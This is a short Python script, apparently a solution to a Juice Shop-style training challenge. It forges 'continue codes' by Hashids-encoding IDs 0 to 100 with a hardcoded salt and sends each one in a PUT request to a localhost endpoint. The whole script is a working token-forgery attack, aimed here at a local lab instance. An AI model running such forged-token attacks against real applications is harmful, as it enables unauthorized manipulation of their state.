from hashids import Hashids
import requests

URL = " http://localhost:3000/rest/continue-code/apply/"

hashids = Hashids(salt="this is my salt", min_length=60,
                  alphabet="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890")

for i in range(100, -1, -1):
    id = hashids.encode(i)
    # print(id)
    URL = f"http://localhost:3000/rest/continue-code/apply/{id}"
    print(URL)
    number = hashids.decode(id)
    # print(number)
    r = requests.put(url=URL)


print("DONE")
